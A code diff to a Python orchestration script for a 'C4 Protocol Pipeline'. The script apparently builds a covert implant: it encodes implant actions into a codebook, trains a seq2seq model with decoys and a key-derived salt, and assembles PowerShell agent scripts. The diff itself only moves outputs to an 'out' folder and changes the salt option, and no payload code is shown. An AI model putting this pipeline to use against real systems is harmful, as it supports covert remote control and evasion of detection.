@@ -36,6 +36,7 @@ console = Console()
 
 # Base directory — all paths are resolved relative to the script location.
 DIR: Path = Path(__file__).parent
+OUT: Path = DIR / "out"
 
 # Each step definition has a "script" (Python file to run), "description"
 # (shown in the Rich UI), and "args" (lambda that builds CLI args from the
@@ -45,13 +46,13 @@ StepDef = dict[str, Any]
 
 STEPS: dict[str, StepDef] = {
     "codebook": {
-        "script": "generate_codebook.py",
+        "script": "build/generate_codebook.py",
         "description": "Generate codebook from implant_actions.yaml",
         "args": lambda a: [
             "--actions",
             str(DIR / a.actions),
             "--output",
-            str(DIR / "codebook.yaml"),
+            str(OUT / "codebook.yaml"),
             "--tool-codes",
             str(a.tool_codes),
             "--param-codes",
@@ -61,34 +62,38 @@ STEPS: dict[str, StepDef] = {
         ],
     },
     "dataset": {
-        "script": "generate_dataset.py",
+        "script": "build/generate_dataset.py",
         "description": "Generate training dataset with salt and decoys",
         "args": lambda a: (
             [
                 "--codebook",
-                str(DIR / "codebook.yaml"),
+                str(OUT / "codebook.yaml"),
                 "--output",
-                str(DIR / "dataset.json"),
+                str(OUT / "dataset.json"),
                 "--num-examples",
                 str(a.num_examples),
                 "--num-decoys",
                 str(a.num_decoys),
                 "--salt-file",
-                str(DIR / "salt.txt"),
+                str(OUT / "salt.txt"),
                 "--seed",
                 str(a.seed),
             ]
-            + (["--salt", a.salt] if a.salt else [])
+            + (
+                ["--public-key", str(DIR / a.public_key)]
+                if a.public_key
+                else []
+            )
         ),
     },
     "train": {
-        "script": "train_seq2seq.py",
+        "script": "build/train_seq2seq.py",
         "description": "Train seq2seq model",
         "args": lambda a: [
             "--dataset",
-            str(DIR / "dataset.json"),
+            str(OUT / "dataset.json"),
             "--output",
-            str(DIR / "models" / "seq2seq_model.pt"),
+            str(OUT / "models" / "seq2seq_model.pt"),
             "--epochs",
             str(a.epochs),
             "--seed",
@@ -96,19 +101,19 @@ STEPS: dict[str, StepDef] = {
         ],
     },
     "export": {
-        "script": "export_weights.py",
+        "script": "build/export_weights.py",
         "description": "Export model weights to SafeTensors",
         "args": lambda _a: [
             "--checkpoint",
-            str(DIR / "models" / "seq2seq_model.pt"),
+            str(OUT / "models" / "seq2seq_model.pt"),
             "--vocab",
-            str(DIR / "models" / "seq2seq_model_onnx" / "vocab.json"),
+            str(OUT / "models" / "seq2seq_model_onnx" / "vocab.json"),
             "--salt-file",
-            str(DIR / "salt.txt"),
+            str(OUT / "salt.txt"),
             "--value-codebook",
             str(DIR / "value_codebook.yaml"),
             "--output",
-            str(DIR / "weights.safetensors"),
+            str(OUT / "weights.safetensors"),
         ],
     },
 }
@@ -174,7 +179,7 @@ def assemble_ps1() -> None:
     """
     console.rule("[bold cyan]assemble[/] — Assemble self-contained PS1 scripts")
 
-    weights_path = DIR / "weights.safetensors"
+    weights_path = OUT / "weights.safetensors"
 
     if not weights_path.exists():
         console.print(f"[bold red]MISSING[/] {weights_path}")
@@ -197,11 +202,11 @@ def assemble_ps1() -> None:
     # Assemble each script
     targets = [
         ("Collect-Decode.ps1", DIR / "Collect-Decode.ps1.template"),
-        ("c4-invoke-pshagent.ps1", DIR / "c4-invoke-pshagent.ps1.template"),
+        ("c4-invoke-pshagent.ps1", DIR / "runtime" / "c4-invoke-pshagent.ps1.template"),
     ]
 
     for name, template_path in targets:
-        output_path = DIR / name
+        output_path = OUT / name
 
         if template_path.exists():
             template = template_path.read_text()
@@ -244,7 +249,7 @@ def _build_ps1_template(script_path: Path) -> str:
 
 def show_summary() -> None:
     """Display a Rich panel with training results from the model metadata file."""
-    meta_path: Path = DIR / "models" / "seq2seq_model_meta.json"
+    meta_path: Path = OUT / "models" / "seq2seq_model_meta.json"
     if not meta_path.exists():
         return
 
@@ -302,7 +307,10 @@ def main() -> None:
         "--num-decoys", type=int, default=1500, help="Decoy training examples"
     )
     parser.add_argument(
-        "--salt", type=str, default=None, help="Salt prefix (auto-generated if omitted)"
+        "--public-key",
+        type=str,
+        default=None,
+        help="Path to RSA public key XML to derive salt from (random if omitted)",
     )
     parser.add_argument("--epochs", type=int, default=80, help="Training epochs")
     parser.add_argument("--seed", type=int, default=42, help="Random seed")
@@ -311,7 +319,8 @@ def main() -> None:
     console.print(Panel("[bold]C4 Protocol Pipeline[/]", border_style="cyan"))
 
     # Ensure models directory exists
-    (DIR / "models").mkdir(exist_ok=True)
+    OUT.mkdir(exist_ok=True)
+    (OUT / "models").mkdir(exist_ok=True)
 
     if args.step:
         steps: list[str] = [args.step]
